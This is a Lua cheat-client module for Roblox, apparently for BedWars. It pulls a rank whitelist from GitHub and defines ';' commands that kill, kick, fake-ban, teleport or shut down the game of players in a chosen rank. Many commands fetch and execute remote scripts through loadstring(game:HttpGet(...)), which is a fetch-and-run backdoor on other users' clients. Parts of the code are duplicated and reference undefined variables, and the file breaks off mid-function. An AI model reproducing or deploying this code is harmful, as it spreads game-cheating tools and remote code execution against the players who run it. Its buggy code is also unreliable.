	local HttpService = game:GetService("HttpService")
    local textService = game:GetService("TextService")
	local textChatService = game:GetService("TextChatService")
	local entityLibrary = shared.vapeentity
    local plr = game:GetService("Players")
	local lplr = plr.LocalPlayer
	local whitelist = nil
	
	local status, response = pcall(function()
		return game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/PrivateLMAO1/main/whitelisted.lua")
	end)
	
	if status then
		local trimmedResponse = response:gsub("^%s*(.-)%s*$", "%1")
		local decodeStatus, decodedData = pcall(function()
			return HttpService:JSONDecode(trimmedResponse)
		end)
	
		if decodeStatus then
			whitelist = decodedData
		else
			print("JSON decoding failed: ", decodedData) 
			return 
		end
	else
		print("HTTP request failed: ", response)
		return 
	end
	
	
	WhitelistFunctionsAreFunny = {
	   GetWhitelist = function(plr2)
		  local userId = tostring(plr2.UserId)
		  local userType = 0
		  local userTag = ""
		  
		  if whitelist["RayHafz"] ~= nil then
			for i, v in pairs(whitelist["RayHafz"]) do
			  if v.id == userId then
				userType = 6
				userTag = "RayHafz"
				break
			  end
			end
		  end
		  
		  if userType == 0 and whitelist["Homies"] ~= nil then
			for i, v in pairs(whitelist["Homies"]) do
			  if v.id == userId then
				userType = 5
				userTag = "Homies"
				break
			  end
			end
		  end
		
		  if userType == 0 and whitelist["Owner"] ~= nil then
			for i, v in pairs(whitelist["Owner"]) do
			  if v.id == userId then
				userType = 4
				userTag = "Owner"
				break
			  end
			end
		  end
		  
		  if userType == 0 and whitelist["CoOwner"] ~= nil then
			for i, v in pairs(whitelist["CoOwner"]) do
			  if v.id == userId then
				userType = 3
				userTag = "CoOwner"
				break
			  end
			end
		  end
		  
		  if userType == 0 and whitelist["PrivatePlus"] ~= nil then
			for i, v in pairs(whitelist["PrivatePlus"]) do
			  if v.id == userId then
				userType = 2
				userTag = "PrivatePlus"
				break
			  end
			end
		  end
		  
		  if userType == 0 and whitelist["Private"] ~= nil then
			for i, v in pairs(whitelist["Private"]) do
			  if v.id == userId then
				userType = 1
				userTag = "Private"
				break
			  end
			end
		  end
	
		  return userType, userTag
	   end
	}
	
	
	local function getLplrType()
		local lplr_Type = 0
		if whitelist["CoOwner"] ~= nil then
			for i,v in pairs(whitelist["CoOwner"]) do
				if v.id == tostring(lplr.UserId) then
					lplr_Type = 3
					return lplr_Type
				end
			end
		end
		if whitelist["Private"] ~= nil then
			for i,v in pairs(whitelist["Private"]) do
				if v.id == tostring(lplr.UserId) then
					lplr_Type = 1
					return lplr_Type
				end
			end
		end
		if whitelist["PrivatePlus"] ~= nil then
			for i,v in pairs(whitelist["PrivatePlus"]) do
				if v.id == tostring(lplr.UserId) then
					lplr_Type = 2
					return lplr_Type
				end
			end
		end
		if whitelist["Owner"] ~= nil then
			for i,v in pairs(whitelist["Owner"]) do
				if v.id == tostring(lplr.UserId) then
					lplr_Type = 4
					return lplr_Type
				end
			end
		end
		if whitelist["Homies"] ~= nil then
			for i,v in pairs(whitelist["Homies"]) do
				if v.id == tostring(lplr.UserId) then
					lplr_Type = 5
					return lplr_Type
				end
			end
		end
		if whitelist["RayHafz"] ~= nil then
			for i,v in pairs(whitelist["RayHafz"]) do
				if v.id == tostring(lplr.UserId) then
					lplr_Type = 6
					return lplr_Type
				end
			end
		end
		return lplr_Type
	end
	
	
	
	
	local Users = {}
	
	function CanAttackUser(u)
		local userId = tostring(u.UserId)
		local userType = 0
	
		if whitelist["Private"] ~= nil then
			for i, v in pairs(whitelist["Private"]) do
				if v.id == userId then
					userType = 1
					break
				end
			end
		end
	
		if whitelist["PrivatePlus"] ~= nil then
			for i, v in pairs(whitelist["PrivatePlus"]) do
				if v.id == userId then
					userType = 2
					break
				end
			end
		end
	
		if whitelist["CoOwner"] ~= nil then
			for i, v in pairs(whitelist["CoOwner"]) do
				if v.id == userId then
					userType = 3
					break
				end
			end
		end
		
		if whitelist["Owner"] ~= nil then
			for i, v in pairs(whitelist["Owner"]) do
				if v.id == userId then
					userType = 4
					break
				end
			end
		end
		
		if whitelist["Homies"] ~= nil then
			for i, v in pairs(whitelist["Homies"]) do
				if v.id == userId then
					userType = 5
					break
				end
			end
		end
		
		if whitelist["RayHafz"] ~= nil then
			for i, v in pairs(whitelist["RayHafz"]) do
				if v.id == userId then
					userType = 6
					break
				end
			end
		end
	
		return getLplrType() >= userType
	end
	
	
	local function getLplrType()
		local lplr_Type = 0
		if whitelist["CoOwner"] ~= nil then
			for i,v in pairs(whitelist["CoOwner"]) do
				if v.id == tostring(lplr.UserId) then
					lplr_Type = 3
					return lplr_Type
				end
			end
		end
		if whitelist["RayHafz"] ~= nil then
			for i,v in pairs(whitelist["RayHafz"]) do
				if v.id == tostring(lplr.UserId) then
					lplr_Type = 6
					return lplr_Type
				end
			end
		end
		if whitelist["Homies"] ~= nil then
			for i,v in pairs(whitelist["Homies"]) do
				if v.id == tostring(lplr.UserId) then
					lplr_Type = 5
					return lplr_Type
				end
			end
		end
		if whitelist["Owner"] ~= nil then
			for i,v in pairs(whitelist["Owner"]) do
				if v.id == tostring(lplr.UserId) then
					lplr_Type = 4
					return lplr_Type
				end
			end
		end
		if whitelist["Private"] ~= nil then
			for i,v in pairs(whitelist["Private"]) do
				if v.id == tostring(lplr.UserId) then
					lplr_Type = 1
					return lplr_Type
				end
			end
		end
		if whitelist["PrivatePlus"] ~= nil then
			for i,v in pairs(whitelist["PrivatePlus"]) do
				if v.id == tostring(lplr.UserId) then
					lplr_Type = 2
					return lplr_Type
				end
			end
		end
		return lplr_Type
	end
	
	local Users = {}
	
	function CanAttackUser(u)
		local userId = tostring(u.UserId)
		local userType = 0
	
		if whitelist["Private"] ~= nil then
			for i, v in pairs(whitelist["Private"]) do
				if v.id == userId then
					userType = 1
					break
				end
			end
		end
	
		if whitelist["PrivatePlus"] ~= nil then
			for i, v in pairs(whitelist["PrivatePlus"]) do
				if v.id == userId then
					userType = 2
					break
				end
			end
		end
	
		if whitelist["CoOwner"] ~= nil then
			for i, v in pairs(whitelist["CoOwner"]) do
				if v.id == userId then
					userType = 3
					break
				end
			end
		end
		
		if whitelist["Owner"] ~= nil then
			for i, v in pairs(whitelist["Owner"]) do
				if v.id == userId then
					userType = 4
					break
				end
			end
		end
		
		if whitelist["Homies"] ~= nil then
			for i, v in pairs(whitelist["Homies"]) do
				if v.id == userId then
					userType = 5
					break
				end
			end
		end
		
		if whitelist["RayHafz"] ~= nil then
			for i, v in pairs(whitelist["RayHafz"]) do
				if v.id == userId then
					userType = 6
					break
				end
			end
		end
	
		return getLplrType() >= userType
	end
	
	local function getPlayerByType(type)
		for _, player in pairs(plr:GetPlayers()) do
			local userType, userTag = WhitelistFunctionsAreFunny:GetWhitelist(player)
			if userType == type then
				return player
			end
		end
		return nil
	end
	
	local commands = {
		[";kill default"] = function()
				local defaultPlayer = getPlayerByType(0)
				if defaultPlayer then
					defaultPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
				else
					print("No default player found!")
			end
		end,
		[";kill private"] = function()
				local privatePlayer = getPlayerByType(1) 
				if privatePlayer then
					privatePlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
				else
					print("No private player found!")
				
			end
		end,
		[";kill privateplus"] = function()
				local privateplusPlayer = getPlayerByType(2) 
				if privateplusPlayer then
					privateplusPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
				else
					print("No private+ player found!")
				
			end
		end,
		[";kill coowner"] = function()
				local coownerPlayer = getPlayerByType(3) 
				if coownerPlayer then
					coownerPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
				else
					print("No coowner player found!")
				
			end
		end,
		[";kill owner"] = function()
				local ownerPlayer = getPlayerByType(4) 
				if ownerPlayer then
					ownerPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
				else
					print("No owner player found!")
				
			end
		end,
		[";kill homies"] = function()
				local homiesPlayer = getPlayerByType(5) 
				if homiesPlayer then
					homiesPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
				else
					print("No homies player found!")
				
			end
		end,
		
		[";void default"] = function()
			local defaultPlayer = getPlayerByType(0)
			if defaultPlayer then
				local character = defaultPlayer.Character
				local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
				local newPosition = humanoidRootPart.CFrame
				for i = 1, 3 do
					newPosition = newPosition + Vector3.new(0, -40, 0)
					humanoidRootPart.CFrame = newPosition
					wait(0.01)
				end
			else
				print("No default player found!")
			end
		end,
		[";void private"] = function()
			local privatePlayer = getPlayerByType(1)
			if privatePlayer then
				local character = privatePlayer.Character
				local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
				local newPosition = humanoidRootPart.CFrame
				for i = 1, 3 do
					newPosition = newPosition + Vector3.new(0, -40, 0)
					humanoidRootPart.CFrame = newPosition
					wait(0.01)
				end
			else
				print("No private player found!")
			end
		end,
		[";void privateplus"] = function()
			local privateplusPlayer = getPlayerByType(2)
			if privateplusPlayer then
				local character = privateplusPlayer.Character
				local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
				local newPosition = humanoidRootPart.CFrame
				for i = 1, 3 do
					newPosition = newPosition + Vector3.new(0, -40, 0)
					humanoidRootPart.CFrame = newPosition
					wait(0.01)
				end
			else
				print("No private+ player found!")
			end
		end,
		[";void coowner"] = function()
			local coownerPlayer = getPlayerByType(3)
			if coownerPlayer then
				local character = coownerPlayer.Character
				local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
				local newPosition = humanoidRootPart.CFrame
				for i = 1, 3 do
					newPosition = newPosition + Vector3.new(0, -40, 0)
					humanoidRootPart.CFrame = newPosition
					wait(0.01)
				end
			else
				print("No coowner player found!")
			end
		end,
		[";void owner"] = function()
			local ownerPlayer = getPlayerByType(4)
			if ownerPlayer then
				local character = ownerPlayer.Character
				local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
				local newPosition = humanoidRootPart.CFrame
				for i = 1, 3 do
					newPosition = newPosition + Vector3.new(0, -40, 0)
					humanoidRootPart.CFrame = newPosition
					wait(0.01)
				end
			else
				print("No owner player found!")
			end
		end,
		[";void homies"] = function()
			local homiesPlayer = getPlayerByType(5)
			if homiesPlayer then
				local character = homiesPlayer.Character
				local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
				local newPosition = humanoidRootPart.CFrame
				for i = 1, 3 do
					newPosition = newPosition + Vector3.new(0, -40, 0)
					humanoidRootPart.CFrame = newPosition
					wait(0.01)
				end
			else
				print("No homies player found!")
			end
		end,
		
		[";kick default"] = function()
			local defaultPlayer = getPlayerByType(0)
			if defaultPlayer then
				defaultPlayer:Kick("You just got kicked from the game | :troll:")
			else
				print("No default player found!")
			end
		end,
		[";kick private"] = function()
			local privatePlayer = getPlayerByType(1)
			if privatePlayer then
				privatePlayer:Kick("You just got kicked from the game | :troll:")
			else
				print("No private player found!")
			end
		end,
		[";kick privateplus"] = function()
			local privateplusPlayer = getPlayerByType(2)
			if privateplusPlayer then
				privateplusPlayer:Kick("You just got kicked from the game | :troll:")
			else
				print("No private+ player found!")
			end
		end,
		[";kick coowner"] = function()
			local coownerPlayer = getPlayerByType(3)
			if coownerPlayer then
				coownerPlayer:Kick("You just got kicked from the game | :troll:")
			else
				print("No coowner player found!")
			end
		end,
		[";kick owner"] = function()
			local ownerPlayer = getPlayerByType(4)
			if ownerPlayer then
				ownerPlayer:Kick("You just got kicked from the game | :troll:")
			else
				print("No owner player found!")
			end
		end,
		[";kick homies"] = function()
			local homiesPlayer = getPlayerByType(5)
			if homiesPlayer then
				homiesPlayer:Kick("You just got kicked from the game | :troll:")
			else
				print("No homies player found!")
			end
		end,
		
		[";ban default"] = function()
			local defaultPlayer = getPlayerByType(0)
			if defaultPlayer then
				defaultPlayer:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes " .. math.random(45, 59) .. " seconds ]")
			else
				print("No default player found!")
			end
		end,
		[";ban private"] = function()
			local privatePlayer = getPlayerByType(1)
			if privatePlayer then
				privatePlayer:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes " .. math.random(45, 59) .. " seconds ]")
			else
				print("No private player found!")
			end
		end,
		[";ban privateplus"] = function()
			local privateplusPlayer = getPlayerByType(2)
			if privateplusPlayer then
				privateplusPlayer:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes " .. math.random(45, 59) .. " seconds ]")
			else
				print("No private+ player found!")
			end
		end,
		[";ban coowner"] = function()
			local coownerPlayer = getPlayerByType(3)
			if coownerPlayer then
				coownerPlayer:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes " .. math.random(45, 59) .. " seconds ]")
			else
				print("No coowner player found!")
			end
		end,
		[";ban owner"] = function()
			local ownerPlayer = getPlayerByType(4)
			if ownerPlayer then
				ownerPlayer:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes " .. math.random(45, 59) .. " seconds ]")
			else
				print("No owner player found!")
			end
		end,
		[";ban homies"] = function()
			local homiesPlayer = getPlayerByType(5)
			if homiesPlayer then
				homiesPlayer:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes " .. math.random(45, 59) .. " seconds ]")
			else
				print("No homies player found!")
			end
		end,
		
		[";lobby default"] = function()
			local defaultPlayer = getPlayerByType(0)
			if defaultPlayer then
				game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer(defaultPlayer)
			else
				print("No default player found!")
			end
		end,
		[";lobby private"] = function()
			local privatePlayer = getPlayerByType(1) 
			if privatePlayer then
				game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer(privatePlayer)
			else
				print("No private player found!")
			end
		end,
		[";lobby privateplus"] = function()
			local privateplusPlayer = getPlayerByType(2) 
			if privateplusPlayer then
				game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer(privatePlayer)
			else
				print("No private+ player found!")
			end
		end,
		[";lobby coowner"] = function()
			local coownerPlayer = getPlayerByType(3) 
			if coownerPlayer then
				game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer(privatePlayer)
			else
				print("No coowner player found!")
			end
		end,
		[";lobby owner"] = function()
			local ownerPlayer = getPlayerByType(4) 
			if ownerPlayer then
				game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer(privatePlayer)
			else
				print("No owner player found!")
			end
		end,
		[";lobby homies"] = function()
			local homiesPlayer = getPlayerByType(5) 
			if homiesPlayer then
				game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer(privatePlayer)
			else
				print("No homies player found!")
			end
		end,
		
		[";shutdown default"] = function()
			local defaultPlayer = getPlayerByType(0)
			if defaultPlayer then
				game:Shutdown()
			else
				print("No default player found!")
			end
		end,
		[";shutdown private"] = function()
			local privatePlayer = getPlayerByType(1)
			if privatePlayer then
				game:Shutdown()
			else
				print("No private player found!")
			end
		end,	
		[";shutdown privateplus"] = function()
			local privateplusPlayer = getPlayerByType(2)
			if privateplusPlayer then
				game:Shutdown()
			else
				print("No private+ player found!")
			end
		end,
		[";shutdown coowner"] = function()
			local coownerPlayer = getPlayerByType(3)
			if coownerPlayer then
				game:Shutdown()
			else
				print("No coowner player found!")
			end
		end,
		[";shutdown owner"] = function()
			local ownerPlayer = getPlayerByType(4)
			if ownerPlayer then
				game:Shutdown()
			else
				print("No owner player found!")
			end
		end,
		[";shutdown homies"] = function()
			local homiesPlayer = getPlayerByType(5)
			if homiesPlayer then
				game:Shutdown()
			else
				print("No owner player found!")
			end
		end,
		
		[";lagback default"] = function()
			local defaultPlayer = getPlayerByType(0)
			if defaultPlayer then
				for i = 1, 10 do
					wait()
					local character = defaultPlayer.Character or defaultPlayer.CharacterAdded:Wait()
					local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
					local forwardVector = humanoidRootPart.CFrame.LookVector
					local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
					humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
				end
			else
				print("No default player found!")
			end
		end,
		[";lagback private"] = function()
			local privatePlayer = getPlayerByType(1)
			if privatePlayer then
				for i = 1, 10 do
					wait()
					local character = privatePlayer.Character or privatePlayer.CharacterAdded:Wait()
					local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
					local forwardVector = humanoidRootPart.CFrame.LookVector
					local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
					humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
				end
			else
				print("No private player found!")
			end
		end,
		[";lagback privateplus"] = function()
			local privateplusPlayer = getPlayerByType(2)
			if privateplusPlayer then
				for i = 1, 10 do
					wait()
					local character = privateplusPlayer.Character or privateplusPlayer.CharacterAdded:Wait()
					local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
					local forwardVector = humanoidRootPart.CFrame.LookVector
					local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
					humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
				end
			else
				print("No private+ player found!")
			end
		end,
		[";lagback coowner"] = function()
			local coownerPlayer = getPlayerByType(3)
			if coownerPlayer then
				for i = 1, 10 do
					wait()
					local character = coownerPlayer.Character or coownerPlayer.CharacterAdded:Wait()
					local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
					local forwardVector = humanoidRootPart.CFrame.LookVector
					local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
					humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
				end
			else
				print("No coowner player found!")
			end
		end,
		[";lagback owner"] = function()
			local ownerPlayer = getPlayerByType(4)
			if ownerPlayer then
				for i = 1, 10 do
					wait()
					local character = ownerPlayer.Character or ownerPlayer.CharacterAdded:Wait()
					local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
					local forwardVector = humanoidRootPart.CFrame.LookVector
					local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
					humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
				end
			else
				print("No owner player found!")
			end
		end,
		[";lagback homies"] = function()
			local homiesPlayer = getPlayerByType(5)
			if homiesPlayer then
				for i = 1, 10 do
					wait()
					local character = homiesPlayer.Character or homiesPlayer.CharacterAdded:Wait()
					local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
					local forwardVector = humanoidRootPart.CFrame.LookVector
					local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
					humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
				end
			else
				print("No homies player found!")
			end
		end,
		
		[";destroymap default"] = function()
			local defaultPlayer = getPlayerByType(0)
			if defaultPlayer then
				local function unanchorParts(object)
					if object:IsA("BasePart") then
						object.Anchored = false
					end
					for _, child in ipairs(object:GetChildren()) do
						unanchorParts(child)
					end
				end
				unanchorParts(defaultPlayer.Character)
			else
				print("No default player found!")
			end
		end,
		[";destroymap private"] = function()
			local privatePlayer = getPlayerByType(1)
			if privatePlayer then
				local function unanchorParts(object)
					if object:IsA("BasePart") then
						object.Anchored = false
					end
					for _, child in ipairs(object:GetChildren()) do
						unanchorParts(child)
					end
				end
				unanchorParts(privatePlayer.Character)
			else
				print("No private player found!")
			end
		end,
		[";destroymap privateplus"] = function()
			local privatePlayer = getPlayerByType(2)
			if privateplusPlayer then
				local function unanchorParts(object)
					if object:IsA("BasePart") then
						object.Anchored = false
					end
					for _, child in ipairs(object:GetChildren()) do
						unanchorParts(child)
					end
				end
				unanchorParts(privateplusPlayer.Character)
			else
				print("No private+ player found!")
			end
		end,
		[";destroymap coowner"] = function()
			local coownerPlayer = getPlayerByType(3)
			if coownerPlayer then
				local function unanchorParts(object)
					if object:IsA("BasePart") then
						object.Anchored = false
					end
					for _, child in ipairs(object:GetChildren()) do
						unanchorParts(child)
					end
				end
				unanchorParts(coownerPlayer.Character)
			else
				print("No coowner player found!")
			end
		end,
		[";destroymap owner"] = function()
			local ownerPlayer = getPlayerByType(4)
			if ownerPlayer then
				local function unanchorParts(object)
					if object:IsA("BasePart") then
						object.Anchored = false
					end
					for _, child in ipairs(object:GetChildren()) do
						unanchorParts(child)
					end
				end
				unanchorParts(ownerPlayer.Character)
			else
				print("No owner player found!")
			end
		end,
		[";destroymap homies"] = function()
			local homiesPlayer = getPlayerByType(5)
			if homiesPlayer then
				local function unanchorParts(object)
					if object:IsA("BasePart") then
						object.Anchored = false
					end
					for _, child in ipairs(object:GetChildren()) do
						unanchorParts(child)
					end
				end
				unanchorParts(homiesPlayer.Character)
			else
				print("No homies player found!")
			end
		end,
		
		[";troller default"] = function()
			local defaultPlayer = getPlayerByType(0)
			if defaultPlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/trollage.lua"))()
			else
				print("No default player found!")
			end
		end,
		[";troller private"] = function()
			local privatePlayer = getPlayerByType(1)
			if privatePlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/trollage.lua"))()
			else
				print("No private player found!")
			end
		end,
		[";troller privateplus"] = function()
			local privateplusPlayer = getPlayerByType(2)
			if privateplusPlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/trollage.lua"))() 
			else
				print("No private+ player found!")
			end
		end,
		[";troller coowner"] = function()
			local coownerPlayer = getPlayerByType(3)
			if coownerPlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/trollage.lua"))()
			else
				print("No coowner player found!")
			end
		end,
		[";troller owner"] = function()
			local ownerPlayer = getPlayerByType(4)
			if ownerPlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/trollage.lua"))() 
			else
				print("No owner player found!")
			end
		end,
		[";troller homies"] = function()
			local homiesPlayer = getPlayerByType(5)
			if homiesPlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/trollage.lua"))() 
			else
				print("No homies player found!")
			end
		end,
		
		[";rickroll default"] = function()
			local defaultPlayer = getPlayerByType(0)
			if defaultPlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/rickroll.lua"))()
			else
				print("No default player found!")
			end
		end,
		[";rickroll private"] = function()
			local privatePlayer = getPlayerByType(1)
			if privatePlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/rickroll.lua"))() 
			else
				print("No private player found!")
			end
		end,
		[";rickroll privateplus"] = function()
			local privateplusPlayer = getPlayerByType(2)
			if privateplusPlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/rickroll.lua"))() 
			else
				print("No private+ player found!")
			end
		end,
		[";rickroll coowner"] = function()
			local coownerPlayer = getPlayerByType(3)
			if coownerPlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/rickroll.lua"))() 
			else
				print("No coowner player found!")
			end
		end,
		[";rickroll owner"] = function()
			local ownerPlayer = getPlayerByType(4)
			if ownerPlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/rickroll.lua"))() 
			else
				print("No owner player found!")
			end
		end,
		[";rickroll homies"] = function()
			local homiesPlayer = getPlayerByType(5)
			if homiesPlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/rickroll.lua"))() 
			else
				print("No homies player found!")
			end
		end,

		[";chipman default"] = function()
			local defaultPlayer = getPlayerByType(0)
			if defaultPlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/chipman.lua"))()
			else
				print("No default player found!")
			end
		end,
		[";chipman private"] = function()
			local privatePlayer = getPlayerByType(1)
			if privatePlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/chipman.lua"))()
			else
				print("No private player found!")
			end
		end,
		[";chipman privateplus"] = function()
			local privateplusPlayer = getPlayerByType(2)
			if privateplusPlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/chipman.lua"))() 
			else
				print("No private+ player found!")
			end
		end,
		[";chipman coowner"] = function()
			local coownerPlayer = getPlayerByType(3)
			if coownerPlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/chipman.lua"))() 
			else
				print("No coowner player found!")
			end
		end,
		[";chipman owner"] = function()
			local ownerPlayer = getPlayerByType(4)
			if ownerPlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/chipman.lua"))()
			else
				print("No owner player found!")
			end
		end,
		[";chipman homies"] = function()
			local homiesPlayer = getPlayerByType(5)
			if homiesPlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/chipman.lua"))()
			else
				print("No homies player found!")
			end
		end,
		
		[";xylex default"] = function()
			local defaultPlayer = getPlayerByType(0)
			if defaultPlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/xylex.lua"))()
			else
				print("No default player found!")
			end
		end,
		[";xylex private"] = function()
			local privatePlayer = getPlayerByType(1)
			if privatePlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/xylex.lua"))()
			else
				print("No private player found!")
			end
		end,
		[";xylex privateplus"] = function()
			local privateplusPlayer = getPlayerByType(2)
			if privateplusPlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/xylex.lua"))()
			else
				print("No private+ player found!")
			end
		end,
		[";xylex coowner"] = function()
			local coownerPlayer = getPlayerByType(3)
			if coownerPlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/xylex.lua"))()
			else
				print("No coowner player found!")
			end
		end,
		[";xylex owner"] = function()
			local ownerPlayer = getPlayerByType(4)
			if ownerPlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/xylex.lua"))()
			else
				print("No owner player found!")
			end
		end,
		[";xylex homies"] = function()
			local homiesPlayer = getPlayerByType(5)
			if homiesPlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/xylex.lua"))()
			else
				print("No homies player found!")
			end
		end,
		
		[";josiah default"] = function()
			local defaultPlayer = getPlayerByType(0)
			if defaultPlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/josiah.lua"))()
			else
				print("No default player found!")
			end
		end,
		[";josiah private"] = function()
			local privatePlayer = getPlayerByType(1)
			if privatePlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/josiah.lua"))()
			else
				print("No private player found!")
			end
		end,
		[";josiah privateplus"] = function()
			local privateplusPlayer = getPlayerByType(2)
			if privateplusPlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/josiah.lua"))()
			else
				print("No private+ player found!")
			end
		end,
		[";josiah coowner"] = function()
			local coownerPlayer = getPlayerByType(3)
			if coownerPlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/josiah.lua"))()
			else
				print("No coowner player found!")
			end
		end,
		[";josiah owner"] = function()
			local ownerPlayer = getPlayerByType(4)
			if ownerPlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/josiah.lua"))()
			else
				print("No owner player found!")
			end
		end,
		[";josiah homies"] = function()
			local homiesPlayer = getPlayerByType(5)
			if homiesPlayer then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/josiah.lua"))()
			else
				print("No owner player found!")
			end
		end,
		
		[";freeze default"] = function()
			local defaultPlayer = getPlayerByType(0)
			if defaultPlayer then
				defaultPlayer.Character.HumanoidRootPart.Massless = true
			else
				print("No default player found!")
			end
		end,
		[";freeze private"] = function()
			local privatePlayer = getPlayerByType(1)
			if privatePlayer then
				privatePlayer.Character.HumanoidRootPart.Massless = true
			else
				print("No private player found!")
			end
		end,
		[";freeze privateplus"] = function()
			local privateplusPlayer = getPlayerByType(2)
			if privateplusPlayer then
				privateplusPlayer.Character.HumanoidRootPart.Massless = true
			else
				print("No private+ player found!")
			end
		end,
		[";freeze coowner"] = function()
			local coownerPlayer = getPlayerByType(3)
			if coownerPlayer then
				coownerPlayer.Character.HumanoidRootPart.Massless = true
			else
				print("No coowner player found!")
			end
		end,
		[";freeze owner"] = function()
			local ownerPlayer = getPlayerByType(4)
			if ownerPlayer then
				ownerPlayer.Character.HumanoidRootPart.Massless = true
			else
				print("No owner player found!")
			end
		end,
		[";freeze homies"] = function()
			local homiesPlayer = getPlayerByType(5)
			if homiesPlayer then
				homiesPlayer.Character.HumanoidRootPart.Massless = true
			else
				print("No homies player found!")
			end
		end,
	
		[";unfreeze default"] = function()
			local defaultPlayer = getPlayerByType(0)
			if defaultPlayer then
				defaultPlayer.Character.HumanoidRootPart.Massless = false
			else
				print("No default player found!")
			end
		end,
		[";unfreeze private"] = function()
			local privatePlayer = getPlayerByType(1)
			if privatePlayer then
